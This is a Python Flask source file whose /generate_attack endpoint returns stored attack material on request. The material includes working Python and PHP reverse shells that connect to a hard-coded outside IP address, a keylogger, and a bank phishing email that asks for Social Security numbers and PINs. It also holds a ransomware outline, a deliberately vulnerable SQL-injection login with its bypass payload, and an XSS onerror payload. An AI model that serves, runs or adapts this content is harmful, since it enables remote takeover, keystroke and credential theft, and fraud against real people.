from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS for frontend-backend communication

# Define responses for specific attack types
attack_strategies = {
    "python rce code": """import socket
import subprocess
import os
import pty

# Create a socket and connect to the attacker server (IP and port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("3.84.151.202", 1234))

# Redirect standard input, output, and error to the socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Spawn a shell
pty.spawn("/bin/sh")
""",
    "phishing": """Dear Valued Customer,

We are contacting you regarding a security update on your account. Our monitoring system has detected some unusual activity, and for your protection, we require you to confirm your identity immediately.

Please verify your account details by clicking on the link below:

Verify Your Account Now

Failure to complete this process within 24 hours may result in the temporary suspension of your account.

For security purposes, please provide the following information:

    Full Name
    Date of Birth
    Account Number
    Social Security Number
    PIN or Password (if available)

Rest assured, this is part of our ongoing commitment to protect your account and personal information. Thank you for your prompt action in this matter.

If you have any questions, please contact our customer service team at support@fakebank.com.

Sincerely,  
The FakeBank Security Team  
“Your Security is Our Priority”""",
    "ransomware": "Ransomware Strategy:\n1. Encrypt critical files on the victim's system.\n2. Demand a ransom for decryption keys.\n3. Use strong encryption algorithms to prevent easy recovery.",
    "php reverse shell code": """<?php
// Reverse shell implementation
$ip = '3.84.151.202';
$port = 1234;
$sock = fsockopen($ip, $port);
exec('/bin/sh -i <&3 >&3 2>&3');
?>""",
    "keylogger": """# Example keylogger code using Python
# Install the required library: pip install pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
""",
    "sql injection": """Here’s an example of **ethical SQL injection testing code** designed to demonstrate **secure coding practices** and how to identify potential vulnerabilities. It uses a simple Flask application with a deliberate SQL injection flaw for testing purposes.

> **Important Note:** This code is for **educational purposes only** and must be run in a controlled, private environment. Never deploy such applications on live systems or use them to test systems without explicit authorization.

---

### Vulnerable Flask Application

This application has an intentionally insecure endpoint to demonstrate the impact of SQL injection. It also includes a secure version for comparison.

#### Flask Application Code

```python
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

# In-memory database setup (for testing only)
def init_db():
    conn = sqlite3.connect(':memory:')  # Use in-memory database
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)")
    cursor.execute("INSERT INTO users (username, password) VALUES ('admin', 'adminpass')")
    cursor.execute("INSERT INTO users (username, password) VALUES ('user1', 'user1pass')")
    conn.commit()
    return conn

# Initialize the database
db_conn = init_db()

@app.route('/vulnerable_login', methods=['POST'])
def vulnerable_login():
    """
    #A vulnerable login endpoint prone to SQL Injection.
    #Example payload for testing injection: {"username": "admin'--", "password": ""}
    """
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    # **Vulnerable Query**: User input directly injected into SQL
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor = db_conn.cursor()
    cursor.execute(query)
    user = cursor.fetchone()

    if user:
        return jsonify({"message": "Login successful!", "user": user})
    else:
        return jsonify({"message": "Invalid credentials."}), 401

@app.route('/secure_login', methods=['POST'])
def secure_login():
    """
    #A secure login endpoint using parameterized queries to prevent SQL Injection.
    """
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    # **Secure Query**: Parameterized to prevent injection
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor = db_conn.cursor()
    cursor.execute(query, (username, password))
    user = cursor.fetchone()

    if user:
        return jsonify({"message": "Login successful!", "user": user})
    else:
        return jsonify({"message": "Invalid credentials."}), 401

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```

---

### How to Test for SQL Injection

1. **Start the Application**:
   - Save the code to a file (e.g., `app.py`) and run it with Python:  
     ```bash
     python app.py
     ```
   - The application will start on `http://127.0.0.1:5000`.

2. **Test the Vulnerable Endpoint**:
   - Use a tool like `curl`, Postman, or a browser extension to send a request to `/vulnerable_login`:
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"username": "admin\'--", "password": "irrelevant"}' http://127.0.0.1:5000/vulnerable_login
     ```
   - If the application is vulnerable, you’ll bypass authentication with the payload.

3. **Test the Secure Endpoint**:
   - Try the same payload with `/secure_login`:
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"username": "admin\'--", "password": "irrelevant"}' http://127.0.0.1:5000/secure_login
     ```
   - The secure endpoint should reject the payload and prevent injection.

---

### Key Points:
1. **Testing Results**:
   - The vulnerable endpoint (`/vulnerable_login`) accepts malicious input and may return the admin account.
   - The secure endpoint (`/secure_login`) protects against SQL injection by using parameterized queries.

2. **Educational Focus**:
   - Highlight the difference between insecure and secure coding practices.
   - Demonstrate the need for parameterized queries and input validation.

3. **Safe Testing**:
   - Ensure this application runs in an isolated environment (e.g., on a local machine or private virtual machine).

Would you like further help with testing tools or improving this example?
""",

"insecure output handling": """
This risk exists when a plugin blindly accepts the output of an LLM and passes it to the backend, providing users with additional control over the application. This can result in CSRF (explained before), SSRF, privilege escalation, remote code execution and XSS (Cross-Site Scripting). As an example, XSS DOM-Based happens when you manipulate the web browser query (https://stackoverflow.com/search?q=xss) with a script that is executed without previous validation:

https://stackoverflow.com/search?q=<img src=1 href=1 onerror="javascript:alert(1)"></img>

Example: the output of the LLM is interpreted by the browser and returned to the user/hacker, what may result in XSS. And then the user requests a query to delete all database tables.

Mitigation:

    Apply input validation not only to the user, but also for the LLM output
    Encode LLM output to mitigate undesirable JavaScript and Markdown code interpretations"""
}

@app.route('/generate_attack', methods=['POST'])
def generate_attack():
    try:
        # Parse the incoming JSON request
        data = request.get_json()
        if not data or 'attack_type' not in data:
            return jsonify({"error": "Invalid request. 'attack_type' is required."}), 400

        attack_type = data['attack_type'].lower()

        # Handle "all" request or individual strategies
        if attack_type == "all":
            # Concatenate all strategies
            response = "\n\n".join([f"**{key.capitalize()}**:\n{value}" for key, value in attack_strategies.items()])
        else:
            # Fetch the corresponding strategy or return a default response
            response = attack_strategies.get(
                attack_type,
                f"No predefined strategy for '{attack_type}'. Please try another attack type."
            )

        return jsonify({"response": response}), 200
    except Exception as e:
        # Log the error for debugging
        print(f"Error: {e}")
        return jsonify({"error": "An error occurred while processing your request."}), 500

if __name__ == '__main__':
    app.run(debug=True, port=2000)
